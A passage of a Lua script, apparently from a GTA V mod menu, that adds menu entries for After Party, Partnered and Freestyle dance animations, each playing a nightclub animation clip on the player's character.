    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_11_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_13_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_15_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 55", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 56", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 57", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 58", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 59", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartymed, "After Party Medium Intensity 60", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@med_intensity", "mi_dance_crowd_17_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 4", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 5", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 6", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 7", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 8", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 9", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 10", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 11", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 12", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_09_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 13", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 14", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 15", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 16", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 17", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 18", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 19", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 20", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 21", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 22", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 23", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 24", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_11_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 25", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 26", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 27", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 28", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 29", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 30", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 31", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 32", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 33", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 34", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 35", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 36", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_13_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 37", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 38", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 39", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 40", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 41", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 42", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 43", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 44", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 45", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 46", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 47", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 48", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_15_v2_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 49", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 50", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 51", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 52", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 53", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 54", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v1_female^6", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 55", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^1", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 56", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^2", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 57", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^3", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 58", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^4", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 59", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^5", -1)
end)
menu.action(dances_vroot_afterpartylow, "After Party Low Intensity 60", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@dancers@crowddance_groups@low_intensity", "li_dance_crowd_17_v2_female^6", -1)
end)

----- PARTNERED -----

menu.action(dancespartnered_vroot, "Nocturnal v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_a@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Nocturnal v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_a@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Wanderlust v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_b@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Wanderlust v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_b@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Dreamcatcher v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_d@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Dreamcatcher v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_d@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Buss It v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_e@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Buss It v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_e@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Heated v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_f@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Heated v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_f@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Flocky v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_h@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Flocky v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_h@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Never Sleep v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_j@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Never Sleep v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_j@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Sky Walker v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_k@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Sky Walker v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_k@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Mile High v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_l@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Mile High v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_l@", "ped_b_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Astro v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_m@", "ped_a_dance_idle", -1)
end)
menu.action(dancespartnered_vroot, "Astro v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_paired@dance_m@", "ped_b_dance_idle", -1)
end)

----- FREESTYLE -----

menu.action(dancesfreestyle_vroot, "Sway High v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@beach_boxing@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Sway High v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@beach_boxing@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Sway High v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@beach_boxing@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Slide High v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@jumper@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Slide High v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@jumper@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Slide High v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@jumper@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Zoned In v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_a@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Zoned In v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_a@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Zoned In v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_a@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Give It Some v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Give It Some v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Give It Some v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@male@var_b@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Tight v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@sand_trip@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Tight v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@sand_trip@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Tight v3", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@sand_trip@", "high_center_down", -1)
end)

menu.action(dancesfreestyle_vroot, "Shuffle v1", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@shuffle@", "high_center", -1)
end)

menu.action(dancesfreestyle_vroot, "Shuffle v2", {""}, "", function(on_click)
    play_animstationary("anim@amb@nightclub@mini@dance@dance_solo@shuffle@", "high_center_up", -1)
end)

menu.action(dancesfreestyle_vroot, "Shuffle v3", {""}, "", function(on_click)
